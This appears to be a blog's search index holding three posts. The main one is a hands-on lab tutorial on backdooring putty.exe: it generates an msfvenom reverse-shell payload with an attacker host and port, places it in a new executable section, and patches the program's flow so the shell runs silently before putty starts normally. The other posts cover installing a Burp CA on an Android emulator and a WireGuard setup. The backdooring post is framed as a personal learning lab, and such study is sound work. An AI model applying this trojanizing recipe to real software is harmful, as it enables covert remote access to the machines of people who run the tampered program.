<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Backdooring PE Files</title>
      <link href="/posts/backdooring-pe-files/"/>
      <url>/posts/backdooring-pe-files/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>This post is written to help me better understand the process of backdooring portable executables (PEs) by using “code caves” and redirecting execution flow. </p><p>Inspiration came from <a href="https://www.ired.team/offensive-security/code-injection-process-injection/backdooring-portable-executables-pe-with-shellcode">https://www.ired.team/offensive-security/code-injection-process-injection/backdooring-portable-executables-pe-with-shellcode</a>, but I’ll be using <code>putty.exe</code> as the target binary instead.</p><h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><p>In this post, we’ll be backdooring PEs through these high level steps:</p><ul><li>Manually introduce a code cave by adding a new PE section</li><li>Add shellcode to our new PE section</li><li>Patch execution flow of the PE to run the shellcode</li><li>Give execution flow back to the PE after shellcode runs</li></ul><p>The last two steps are the most complicated and the whole process is easier said than done. </p><h1 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h1><p>We’ll be utilizing a Windows 10 victim VM and a Kali Linux attacker VM throughout the lab. Their respective IPs are listed below (noted for catching rev shells):</p><ul><li>Kali - <code>192.168.248.148</code></li><li>Windows 10 - <code>192.168.248.150</code></li></ul><p>Here are the tools we’ll be using:</p><ul><li><code>msfvenom</code> - to generate shellcode</li><li><code>CFF Explorer</code> - to manipulate PE sections</li><li><code>HxD</code> - to patch our binary</li><li><code>x32dbg</code> - to debug&#x2F;patch</li></ul><p>Our target PE of choice will be <code>putty.exe</code> - specifically the <code>32-bit x86</code> version, which can be downloaded from:</p><ul><li><a href="https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html">https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html</a></li></ul><h1 id="Manual-Proof-of-Concept-POC"><a href="#Manual-Proof-of-Concept-POC" class="headerlink" title="Manual Proof-of-Concept (POC)"></a>Manual Proof-of-Concept (POC)</h1><p>Before we try to do any redirection of execution flow, let’s manually step through the theories of this technique: generating shellcode, placing it in a new PE section, and manually redirecting the EIP to our shellcode.</p><h2 id="msfvenom-Shellcode"><a href="#msfvenom-Shellcode" class="headerlink" title="msfvenom Shellcode"></a>msfvenom Shellcode</h2><p>To begin, generate a simple reverse shell with <code>msfvenom</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.248.148 LPORT=8080 -o rev.exe</span><br></pre></td></tr></table></figure><p>We’ll need to get the raw hex-bytes for later. This can be done using <code>xxd</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxd -p -l 1000 rev.exe</span><br></pre></td></tr></table></figure><p><img src="/posts/backdooring-pe-files/image-20240310203628586.png"></p><h2 id="Adding-a-New-PE-Section"><a href="#Adding-a-New-PE-Section" class="headerlink" title="Adding a New PE Section"></a>Adding a New PE Section</h2><p>Open <code>putty.exe</code> in CFF Explorer, navigate to <code>Section Headers</code>, and right-click to <code>Add Section (Empty Space)</code>. Make sure to make the size of the section at least 324 bytes - the size of our shellcode. Here, I’ll specify 200h - which is 512 bytes.</p><p><img src="/posts/backdooring-pe-files/image-20240310151913464.png"></p><p>I’ll rename the section to <code>.code</code> and right-click <code>Change Section Flags</code><br><img src="/posts/backdooring-pe-files/image-20240310152255772.png"></p><p>Make sure that the section is readable, writeable, executable, and contains code.<br><img src="/posts/backdooring-pe-files/image-20240310152340682.png"></p><p>Take note that the <code>Raw Address</code> of the section is <code>00166200</code> and make sure to save the changes.</p><h2 id="Insert-Shellcode-into-New-Section"><a href="#Insert-Shellcode-into-New-Section" class="headerlink" title="Insert Shellcode into New Section"></a>Insert Shellcode into New Section</h2><p>From here, open the binary in <code>HxD</code>. Navigate to <code>Search -&gt; Go to...</code></p><p><img src="/posts/backdooring-pe-files/image-20240310152743665.png"></p><p>Go to offset <code>00166200</code>, where our new section is.</p><p><img src="/posts/backdooring-pe-files/image-20240310152827261.png"></p><p>You should see an empty section of code.<br><img src="/posts/backdooring-pe-files/image-20240310152907463.png"></p><p>We’ll insert our shellcode into this. Using the same <code>xxd</code> command before, copy the hex output.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxd -p -l 1000 rev.exe</span><br></pre></td></tr></table></figure><p><img src="/posts/backdooring-pe-files/image-20240310203837253.png"></p><p>Right-click in <code>HxD</code> and <code>Paste write</code></p><p><img src="/posts/backdooring-pe-files/image-20240310153045244.png"></p><p>The newly pasted code section should be red. Make sure to save the changes.</p><p><img src="/posts/backdooring-pe-files/image-20240310153106387.png"></p><h2 id="Manually-Trigger-the-Shellcode"><a href="#Manually-Trigger-the-Shellcode" class="headerlink" title="Manually Trigger the Shellcode"></a>Manually Trigger the Shellcode</h2><p>Now that our shellcode is in the binary, let’s try to manually force it to execute in <code>x32dbg</code>. </p><p>Open the binary in <code>x32dbg</code> and navigate to <code>Memory Map</code>. We should see the <code>.code</code> section at <code>010DF000</code>. This address could have also been calculated by using the base address of <code>putty.exe</code> at <code>00F70000</code> and adding the relative virtual address of the <code>.code</code> section of <code>0016F000</code> to get <code>00F70000 + 0016F000 = 010DF000</code></p><p><img src="/posts/backdooring-pe-files/image-20240310153626835.png"></p><p>Double-click the section and if we follow it in dump, we should see the hex bytes of our shellcode.<br><img src="/posts/backdooring-pe-files/image-20240310154039487.png"></p><p>With everything in place, we can start a listener on our attacker machine, manually set the EIP to <code>010DF000</code> (1) and continue execution (2). We should see a reverse shell connect back (3).</p><p><img src="/posts/backdooring-pe-files/image-20240310154355294.png"></p><p>Here is the whole process in action:<br><img src="/posts/backdooring-pe-files/backdoor_pe.gif"></p><p>We have successfully triggered the shellcode. Now, we know that the theories are in place and we have laid the groundworks for what’s coming next.</p><h1 id="Execution-Redirection"><a href="#Execution-Redirection" class="headerlink" title="Execution Redirection"></a>Execution Redirection</h1><p>With the help of a debugger, we were able to manually trigger our shellcode. Now, we’ll attempt to patch the binary so that the shell triggers automatically and redirects execution back to <code>putty.exe</code></p><p>The patching process can be a little complicated and tedious. The high level step are as follows:</p><ol><li>Prepend the shellcode with <code>pushad</code> and <code>pushfd</code> instructions</li><li>Overwrite a 5 byte instruction in <code>putty.exe</code> with a jump to our shellcode</li><li>Append the shellcode with code that will restore the stack frame and redirect execution back to <code>putty.exe</code></li></ol><h2 id="Prepending-our-Shellcode"><a href="#Prepending-our-Shellcode" class="headerlink" title="Prepending our Shellcode"></a>Prepending our Shellcode</h2><p>Before anything, the first modification we want to make to our shellcode is to prepend it with the <code>pushfd</code> and <code>pushad</code> instructions. These instructions will push the contents of registers right before shellcode execution onto the stack. We will want to restore these states after we execute our shellcode.</p><ul><li><a href="https://www.felixcloutier.com/x86/pusha:pushad">https://www.felixcloutier.com/x86/pusha:pushad</a></li><li><a href="https://www.felixcloutier.com/x86/pushf:pushfd:pushfq">https://www.felixcloutier.com/x86/pushf:pushfd:pushfq</a></li></ul><p>This process is relatively easy. <code>pushad</code>‘s opcode is <code>60</code> and <code>pushfd</code>‘s opcode is <code>9C</code>. We just need to insert these right before our shellcode in <code>HxD</code>. I recommend putting <code>609C</code> before your shellcode and just pasting it as a whole into <code>HxD</code>.</p><p><img src="/posts/backdooring-pe-files/image-20240310193300866.png"></p><h2 id="Jumping-to-our-Shellcode"><a href="#Jumping-to-our-Shellcode" class="headerlink" title="Jumping to our Shellcode"></a>Jumping to our Shellcode</h2><p>The next step we want to do is to find a 5 byte instruction where we can overwrite with <code>jmp &lt;addr_of_shellcode&gt;</code>.</p><p>Step through the execution of <code>putty.exe</code> in a debugger. We see a 5 byte instruction at <code>0073FA61</code>. We’ll take a note of this instruction and the next for later.</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0073FA61 | E8 3A070000              | call putty.7401A0                       | (assembly: call 0x007401A0)</span><br><span class="line">0073FA66 | 6A 01                    | push 1                                  |</span><br></pre></td></tr></table></figure><p><img src="/posts/backdooring-pe-files/image-20240310193447062.png"></p><p>Overwrite the instruction with a jump to our shellcode. In this case, it’s at <code>0080F000</code><br><img src="/posts/backdooring-pe-files/image-20240310193538819.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp 0x0080F000</span><br></pre></td></tr></table></figure><p>To patch, Right-click -&gt; <code>Assemble</code> and put our jump instruction in.<br><img src="/posts/backdooring-pe-files/image-20240310193615493.png"></p><p><img src="/posts/backdooring-pe-files/image-20240310193630408.png"></p><p><img src="/posts/backdooring-pe-files/image-20240310193644246.png"></p><p>Next, we’ll attempt to add a few modifications to our shellcode to redirect the execution back to <code>putty.exe</code>.</p><h2 id="Appending-our-Shellcode"><a href="#Appending-our-Shellcode" class="headerlink" title="Appending our Shellcode"></a>Appending our Shellcode</h2><p>There are several places where we need to modify our shellcode in order to have the redirection work properly. Mainly, the modifications consist of:</p><ul><li>Unblocking the thread by patching <code>WaitForSignaledObject</code></li><li>Restoring the stack frame and register states with <code>popfd</code> and <code>popad</code></li><li>Restore the overwritten instruction</li><li>Jump to next instruction right after overwritten instruction</li></ul><h3 id="Unblocking-the-Thread"><a href="#Unblocking-the-Thread" class="headerlink" title="Unblocking the Thread"></a>Unblocking the Thread</h3><p>If we ran the previous modification with the jump instruction to our shellcode, you’ll notice that although we catch the reverse shell, the <code>putty.exe</code> GUI won’t display afterwards.</p><p>The reason <code>putty.exe</code> isn’t showing its GUI is because the shellcode execution is blocking the thread by calling <code>WaitForSignaledObject</code> with <code>-1 (INFINITE)</code>  as the argument - essentially blocking it forever. We want to make sure the value passed in as the argument is <code>0</code>.</p><p>The instruction <code>dec esi</code> at <code>0080F11B</code> changes ESI to <code>-1</code>, which is then pushed onto the stack as an argument to <code>WaitForSignaledObject</code><br><img src="/posts/backdooring-pe-files/image-20240310201003514.png"></p><p>We can attempt to NOP out the instruction, so that ESI stays <code>0</code> - telling the thread to wait for 0 seconds before unblocking.<br><img src="/posts/backdooring-pe-files/image-20240310201017372.png"></p><h3 id="Restore-Stack-Frame-Execution"><a href="#Restore-Stack-Frame-Execution" class="headerlink" title="Restore Stack Frame &amp; Execution"></a>Restore Stack Frame &amp; Execution</h3><p>Now, we modify the end of the shellcode to restore our stack frame and register states to before our shellcode execution. Then, we can pass execution back to <code>putty.exe</code>.</p><p>At the end of our shellcode, you’ll notice a <code>call ebp</code> instruction. This essentially closes the <code>putty.exe</code> process after our thread has executed. We will start patching from this last instruction.<br><img src="/posts/backdooring-pe-files/image-20240310205922936.png"></p><p>We’ll want to replace this with an instruction that restores our ESP to before our shellcode execution, but after our <code>pushad</code> and <code>pushfd</code> instructions. To find this value, we can put a breakpoint after the <code>pushad</code> and <code>pushfd</code> instructions and note the ESP right after. In this case, it’s <code>012FFB00</code>.<br><img src="/posts/backdooring-pe-files/image-20240310205720973.png"></p><p>The ESP after our shellcode execution is <code>012FF8FC</code><br><img src="/posts/backdooring-pe-files/image-20240310205825552.png"></p><p>This means that the stack grew by <code>0x204</code> bytes<br><img src="/posts/backdooring-pe-files/image-20240310205852824.png"></p><p>From this, we will add the following instructions to our shellcode:</p><ul><li>Increase the ESP by <code>0x204</code> bytes to restore the stack</li><li>Restore register states with <code>popfd</code> and <code>popad</code></li><li>Add the instruction we previously overwrote in <a href="#Jumping-to-our-Shellcode">Jumping to our Shellcode</a></li><li>Jump back to the instruction right after the instruction we overwrote</li></ul><p>In this case, we would append the following to the shellcode:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add esp, 0x204</span><br><span class="line">popfd</span><br><span class="line">popad</span><br><span class="line">call 0x007401A0</span><br><span class="line">jmp 0x0073FA66</span><br></pre></td></tr></table></figure><p><img src="/posts/backdooring-pe-files/image-20240310201108577.png"></p><p>Patch the file by Right-clicking -&gt; <code>Patches</code>, select all patches, and click <code>Patch File</code><br><img src="/posts/backdooring-pe-files/image-20240310212548779.png"><br><img src="/posts/backdooring-pe-files/image-20240310212627368.png"></p><p>We’ll save the file as <code>putty_patched.exe</code></p><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><p>Now, we should have a fully patched file. Let’s test it. We should see our shellcode execute and pass execution right back to <code>putty.exe</code>. To the target, it’s as if nothing happened :D</p><p><img src="/posts/backdooring-pe-files/backdoor_pe_patched.gif"></p><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>We were able to successfully embed a reverse shell into a 32-bit <code>putty.exe</code> PE binary. It must be noted that this technique is extremely well signatured. Windows Defender was turned off throughout this lab - although at some points it still picked it up (can never trust when Defender is truly off…) </p><p>Here’s a speedrun attempt :)</p><div id="dplayer0" class="dplayer hexo-tag-dplayer-mark" style="margin-bottom: 20px;"></div><script>(function(){var player = new DPlayer({"container":document.getElementById("dplayer0"),"video":{"url":"/posts/backdooring-pe-files/demo.mp4"}});window.dplayers||(window.dplayers=[]);window.dplayers.push(player);})()</script><hr><p>References:<br><a href="https://www.ired.team/offensive-security/code-injection-process-injection/backdooring-portable-executables-pe-with-shellcode">https://www.ired.team/offensive-security/code-injection-process-injection/backdooring-portable-executables-pe-with-shellcode</a><br><a href="https://ap3x.github.io/posts/backdooring-portable-executables-(pe)/">https://ap3x.github.io/posts/backdooring-portable-executables-(pe)/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Malware </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Installing System-level CAs on Android</title>
      <link href="/posts/install-ca-android/"/>
      <url>/posts/install-ca-android/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>I’ve been trying to play around with pentesting android apps and have run into some problems. I thought that the traffic intercept work flow would simply consist of:</p><ul><li>Start Burp Suite Proxy</li><li>Install user-level Burp CA in Android</li><li>Point proxy settings in Android device to Burp</li><li>Start intercepting traffic</li></ul><p>However, I’ve been experiencing some problems with a user-level CA installed.<br><img src="/posts/install-ca-android/image-20240309141702680.png"></p><p><img src="/posts/install-ca-android/image-20240309141716591.png"></p><p>Apparently, starting with Android Nougat (API &gt;&#x3D;24), it is no longer possible to just install Burp Suite’s CA as a user certificate to start intercepting traffic. Apps now will only trust system level CAs. </p><ul><li><a href="https://android-developers.googleblog.com/2016/07/changes-to-trusted-certificate.html">https://android-developers.googleblog.com/2016/07/changes-to-trusted-certificate.html</a></li></ul><p>One way to get around this is to install the Burp CA as a <strong>system-level CA</strong></p><h1 id="Installing-system-level-Trusted-CAs"><a href="#Installing-system-level-Trusted-CAs" class="headerlink" title="Installing system-level Trusted CAs"></a>Installing system-level Trusted CAs</h1><p>In Android, trusted CAs are located at <code>/system/etc/security/cacerts</code> using a special format. Certificates must be in the PEM format with the filename of <code>&lt;subject_hash_old&gt;.0</code></p><h2 id="1-Export-Burp-CA-and-convert-to-PEM"><a href="#1-Export-Burp-CA-and-convert-to-PEM" class="headerlink" title="1. Export Burp CA and convert to PEM"></a>1. Export Burp CA and convert to PEM</h2><p><img src="/posts/install-ca-android/image-20240309141931258.png"></p><p>We can then use <code>openssl</code> to convert the <code>.der</code> file to <code>.pem</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">openssl x509 -inform DER -<span class="keyword">in</span> cacert.der -out cacert.pem</span><br><span class="line">openssl x509 -inform PEM -subject_hash_old -<span class="keyword">in</span> cacert.pem |<span class="built_in">head</span> -1</span><br><span class="line"><span class="built_in">mv</span> cacert.pem &lt;<span class="built_in">hash</span>&gt;.0</span><br></pre></td></tr></table></figure><p><img src="/posts/install-ca-android/image-20240309142119784.png"></p><h2 id="2-Copy-the-CA-to-the-device"><a href="#2-Copy-the-CA-to-the-device" class="headerlink" title="2. Copy the CA to the device"></a>2. Copy the CA to the device</h2><p>In order to install the certificate as a trusted CA, we need to copy the file to <code>/system/etc/security/cacerts</code>, which isn’t normally accessible by normal users. We have to remount <code>/system</code> to be writeable, which can be done via <code>adb root</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">adb devices</span><br><span class="line">adb root</span><br><span class="line">adb remount</span><br><span class="line">adb push &lt;cert&gt;.0 /sdcard/</span><br></pre></td></tr></table></figure><p>As an example, here I’m using NoxPlayer as the emulator of choice<br><img src="/posts/install-ca-android/image-20240309142528753.png"></p><p>From here, go into <code>adb shell</code> and transfer the CA file from <code>/sdcard</code> to <code>/system/etc/security/cacerts/</code> and reboot</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">adb shell</span><br><span class="line"><span class="built_in">mv</span> /sdcard/&lt;cert&gt;.0 /system/etc/security/cacerts/</span><br><span class="line"><span class="built_in">chmod</span> 644 /system/etc/security/cacerts/&lt;cert&gt;.0</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure><p><img src="/posts/install-ca-android/image-20240309142830510.png"></p><h2 id="3-Check-Trusted-Credentials"><a href="#3-Check-Trusted-Credentials" class="headerlink" title="3. Check Trusted Credentials"></a>3. Check Trusted Credentials</h2><p>Depending on the Android device, navigate into something like <code>Settings -&gt; Security &amp; Location -&gt; Encryption &amp; Credentials -&gt; Trusted Credentials</code> and check that <code>PortSwigger</code> is installed as a system-level CA.</p><p><img src="/posts/install-ca-android/image-20240309143118272.png"></p><h2 id="4-Manually-Set-Proxy"><a href="#4-Manually-Set-Proxy" class="headerlink" title="4. Manually Set Proxy"></a>4. Manually Set Proxy</h2><p>Now that we have the CA installed, we can start our proxy. First, make sure that Burp proxy is set on All interfaces.<br><img src="/posts/install-ca-android/image-20240309143707275.png"></p><p>Next, make note of the IP of the host running Burp Suite. Here it’s <code>192.168.248.175</code> for me.<br><img src="/posts/install-ca-android/image-20240309143822411.png"></p><p>Go into <code>Settings -&gt; Network &amp; Internet -&gt; Wi-Fi</code> and set the <code>Proxy</code> setting to <code>Manual</code> and fill in the proxy hostname and proxy port (Burp defaults to <code>8080</code>)<br><img src="/posts/install-ca-android/image-20240309143950370.png"></p><h2 id="5-Start-Intercepting"><a href="#5-Start-Intercepting" class="headerlink" title="5. Start Intercepting"></a>5. Start Intercepting</h2><p>At this point, Burp should be intercepting all the network traffic on the Android device. Start an app, and you should start seeing traffic coming in.</p><p><img src="/posts/install-ca-android/image-20240309144231357.png"></p><hr><p>References:</p><ul><li><a href="https://blog.ropnop.com/configuring-burp-suite-with-android-nougat/">https://blog.ropnop.com/configuring-burp-suite-with-android-nougat/</a></li><li><a href="https://android-developers.googleblog.com/2016/07/changes-to-trusted-certificate.html">https://android-developers.googleblog.com/2016/07/changes-to-trusted-certificate.html</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> Burp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Wireguard Quick Start</title>
      <link href="/posts/wireguard/"/>
      <url>/posts/wireguard/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h1><p>Server:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install wireguard</span><br><span class="line"></span><br><span class="line">wg genkey | sudo <span class="built_in">tee</span> /etc/wireguard/private.key</span><br><span class="line">sudo <span class="built_in">chmod</span> go= /etc/wireguard/private.key</span><br><span class="line"></span><br><span class="line">sudo <span class="built_in">cat</span> /etc/wireguard/private.key | wg pubkey | sudo <span class="built_in">tee</span> /etc/wireguard/public.key</span><br><span class="line"></span><br><span class="line">sudo vim /etc/wireguard/wg0.conf</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /etc/wireguard/wg0.conf</span></span><br><span class="line">[Interface]</span><br><span class="line">PrivateKey = base64_encoded_private_key_goes_here</span><br><span class="line">Address = 10.0.0.1/24</span><br><span class="line">ListenPort = 51820</span><br><span class="line">SaveConfig = <span class="literal">true</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wg-quick up wg0</span><br><span class="line">systemctl <span class="built_in">enable</span> wg-quick@wg0</span><br><span class="line">systemctl status wg-quick@wg0</span><br></pre></td></tr></table></figure><p>Peer client:</p><ul><li>Same steps but different conf file<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /etc/wireguard/wg0.conf</span></span><br><span class="line">[Interface]</span><br><span class="line">PrivateKey = base64_encoded_peer_private_key_goes_here</span><br><span class="line">Address = 10.0.0.2/24</span><br><span class="line">PostUp = ping -c1 10.0.0.1 <span class="comment"># Initialize tunnel</span></span><br><span class="line"></span><br><span class="line">[Peer]</span><br><span class="line">PublicKey = base64_encoded_server_public_key</span><br><span class="line">AllowedIPs = 10.0.0.0/24</span><br><span class="line">Endpoint = 192.168.248.129:51820</span><br></pre></td></tr></table></figure></li></ul><p>Finally, add peer to server config</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo wg <span class="built_in">set</span> wg0 peer &lt;peer_public_key&gt; allowed-ips 10.0.0.2</span><br></pre></td></tr></table></figure><p>alternatively, put the following in the server config</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">[Peer]</span><br><span class="line">PublicKey = &lt;peer_public_key&gt;</span><br><span class="line">AllowedIPs = 10.0.0.2/24</span><br></pre></td></tr></table></figure><p>To stop:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl <span class="built_in">disable</span> wg-quick@wg0</span><br><span class="line">sudo wg-quick down wg0</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
